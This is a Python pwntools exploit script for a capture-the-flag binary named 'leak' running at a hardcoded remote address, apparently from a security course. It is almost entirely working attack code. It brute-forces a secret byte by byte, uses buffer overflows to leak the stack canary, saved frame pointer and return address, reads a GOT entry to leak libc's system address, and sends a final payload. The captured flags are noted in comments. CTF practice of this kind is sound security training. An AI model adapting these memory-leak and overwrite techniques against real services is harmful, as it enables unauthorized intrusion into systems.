from pwn import *

local = False
elf = 'leak'

if local:
    context.binary = './' + elf
    r = process('./'+elf)
else:
    ip = "140.114.77.172"
    port = "10002"
    r = remote(ip, port)

context.arch = 'amd64'

# Leak Secret
found = 0
secret = ''
payload = 'A'*8
while found < 8:
    for i in range(0,256):
    	r.recvuntil('>')
        r.sendline("1")
        r.recvuntil(": ")
    	r.send(payload + chr(i))
    	recv = r.recvline()
    	if recv == 'H:NoNoNo\n':
            if len(hex(i)[2:]) < 2:
                pre = "0" + hex(i)[2:]
            else:
                pre = hex(i)[2:]
	    secret = pre + secret
	    payload += chr(i)
            found += 1
	    break
secret = "0x" + secret
print("Secret : ", secret)
# Leak Secret End 

# Canary & Stack
payload = 'A' * 0x208

r.recvuntil('>')
r.sendline("2")
r.recvuntil("]\n")
r.sendline("y")
check = r.recvline()
r.send(payload + 'B')
r.recvuntil("2019\n")
r.recvuntil("B")
canary_rbp = r.recvline(keepends=False) #canary + rbp
r.recvuntil("]\n")
r.sendline("y")
r.recvuntil("]\n")
r.sendline("y")
r.recvline()
r.send(payload + chr(0))
r.recvuntil("]\n")
r.sendline("n")

canary_rbp = chr(0) + canary_rbp
canary = canary_rbp[0:8]
canary = canary[::-1]
rbp = canary_rbp[8:]
rbp = "\x00\x00" + rbp[::-1]

# canary transform
hex_canary = []
for i in range(len(canary)):
    hex_canary.append(ord(canary[i]))
canary = "0x"
for i in hex_canary:
    if len(hex(i)[2:]) < 2:
        pre = "0" + hex(i)[2:]
    else:
        pre = hex(i)[2:]
    canary += pre
# rbp transform
hex_rbp = []
for i in range(len(rbp)):
    hex_rbp.append(ord(rbp[i]))
rbp = "0x"
for i in hex_rbp:
    if len(hex(i)[2:]) < 2:
        pre = "0" + hex(i)[2:]
    else:
        pre = hex(i)[2:]
    rbp += pre

print("Canary : ", canary)
print("RBP : ", rbp)
# chr <-> ord
# Canary & Stack End

'''
r.recvuntil('>')
r.sendline("5")
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.sendline("1")
'''

ret_addr = hex(int(rbp, 16) - 0x20 + 0x08)
#print(ret_addr)

# 0x00007ffe437dac60
# s2 : 0x7ffe437dabf0
# return_addr = (old_rbp - 0x20)(rbp) + 0x08

#print(p64(int(ret_addr, 16)))
payload = 'C'*0x20 + p64(int(ret_addr, 16)) + 'B'*0x20 + '\x00'
#print(payload)

# Grill payload will be stored while calling ShowMessage latter
r.recvuntil('>')
r.sendline('2')
r.recvuntil(']\n')
r.sendline('y')
r.recvline()
r.send(payload)
r.recvuntil("]\n")
r.sendline('n')

# LeaveMessage : send 'C'*0x20, index = 0
r.recvuntil('>')
r.sendline('3')
r.recvuntil(': ')
r.sendline('0')
r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.send('C'*0x20)

# ShowMessage : show index 1, the return value is an address
r.recvuntil('>')
r.sendline('4')
r.recvuntil(': ')
#raw_input('1')
r.sendline('1')
r.recvuntil(': ')
leak_ret_addr = r.recvline(keepends=False)

# leak_ret_addr transform
hex_rbp = []
leak_ret_addr = leak_ret_addr[::-1]
for i in range(len(leak_ret_addr)):
    hex_rbp.append(ord(leak_ret_addr[i]))
leak_ret_addr = "0x"
for i in hex_rbp:
    if len(hex(i)[2:]) < 2:
        pre = "0" + hex(i)[2:]
    else:
        pre = hex(i)[2:]
    leak_ret_addr += pre
print(leak_ret_addr)

# the difference between the return value and the address of ListMessage is a fixed value
ListMessage_addr = hex(int(leak_ret_addr, 16) + 0x2447)

print("ListMessage address : ", ListMessage_addr)

# Use ListMessage -0x88 as GOT of system address, After using ShowMessage the return value will be address of system
r.recvuntil('>')
payload = 'C'*0x20 + p64(int(ListMessage_addr, 16) - 0x88) + 'B'*0x20 + '\x00'
r.sendline('2')
r.recvuntil(']\n')
r.sendline('y')
r.recvline()
r.send(payload)
r.recvuntil("]\n")
r.sendline('n')

# LeaveMessage : send 'C'*0x20, index = 0
r.recvuntil('>')
r.sendline('3')
r.recvuntil(': ')
r.sendline('0')
r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.send('C'*0x20)

# ShowMessage : show index 1, the return value is an address of system
r.recvuntil('>')
r.sendline('4')
r.recvuntil(': ')
#raw_input('1')
r.sendline('1')
r.recvuntil(': ')
leak_libc_addr = r.recvline(keepends=False)

# leak_libc_addr transform
hex_rbp = []
leak_libc_addr = leak_libc_addr[::-1]
for i in range(len(leak_libc_addr)):
    hex_rbp.append(ord(leak_libc_addr[i]))
leak_libc_addr = "0x"
for i in hex_rbp:
    if len(hex(i)[2:]) < 2:
        pre = "0" + hex(i)[2:]
    else:
        pre = hex(i)[2:]
    leak_libc_addr += pre
print("Libc address : ", leak_libc_addr)
'''
# CheckAns
r.recvuntil('>')
r.sendline('5')
r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
payload = p64(int(rbp, 16)-0x70) + p64(int(secret, 16)) + p64(int(canary, 16))
print(payload)
r.send(payload)
'''
# CheckAns
r.recvuntil('>')
r.sendline('5')
r.recvuntil('>')
r.sendline('2')
r.recvuntil(': ')
payload = p64(int(rbp, 16)-0x70) + p64(int(ListMessage_addr, 16)) + p64(int(leak_libc_addr, 16)) + p64(int(secret, 16)) + p64(int(canary, 16))
r.send(payload)
r.interactive()

# flag flag{LLLLLeeeeeeeAAAAaAAaaKKKcckcckkkckkkk!!!!~~~~~~~~}
# flag1 flag{you___are_familiar_with_leak_skill_right?}
